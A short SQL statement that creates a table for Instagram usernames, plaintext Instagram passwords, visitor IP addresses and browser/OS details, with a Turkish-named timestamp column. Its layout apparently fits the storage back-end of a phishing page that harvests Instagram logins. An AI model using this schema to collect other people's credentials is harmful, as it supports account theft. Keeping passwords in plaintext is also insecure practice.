create table instagram_users_logs (

id SMALLINT PRIMARY KEY AUTO_INCREMENT,
ig_username varchar(120) NOT NULL,
ig_password varchar(120) NOT NULL,
user_ip_logs varchar(50) NOT NULL,
user_os_browser_logs varchar(255) NOT NULL,
Kayıt_Tarih datetime default CURRENT_TIMESTAMP
    
)
